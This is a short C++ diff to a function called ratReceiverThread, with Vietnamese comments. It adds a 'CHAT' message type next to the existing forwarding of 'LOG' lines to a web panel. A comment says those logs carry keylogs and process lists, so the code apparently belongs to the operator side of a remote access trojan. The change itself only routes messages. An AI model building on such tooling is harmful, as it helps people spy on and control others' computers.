@@ -180,9 +180,21 @@ void ratReceiverThread() {
             }
         }
         else {
-            string safeLine = escapeJsonString(line);
-            string json = "{\"type\":\"LOG\", \"data\":\"" + safeLine + "\"}";
-            sendWebFrame(json);
+            // --- LOGIC MỚI: Kiểm tra gói tin Chat ---
+            if (line.rfind("CHAT:", 0) == 0) {
+                // Server gửi: "CHAT:[Server]: Hello"
+                string content = line.substr(5); // Bỏ chữ "CHAT:"
+                string safeContent = escapeJsonString(content);
+                // Gửi type riêng là "CHAT"
+                string json = "{\"type\":\"CHAT\", \"data\":\"" + safeContent + "\"}";
+                sendWebFrame(json);
+            } 
+            else {
+                // Các Log thông thường (Keylog, Process list...)
+                string safeLine = escapeJsonString(line);
+                string json = "{\"type\":\"LOG\", \"data\":\"" + safeLine + "\"}";
+                sendWebFrame(json);
+            }
         }
     }
 }
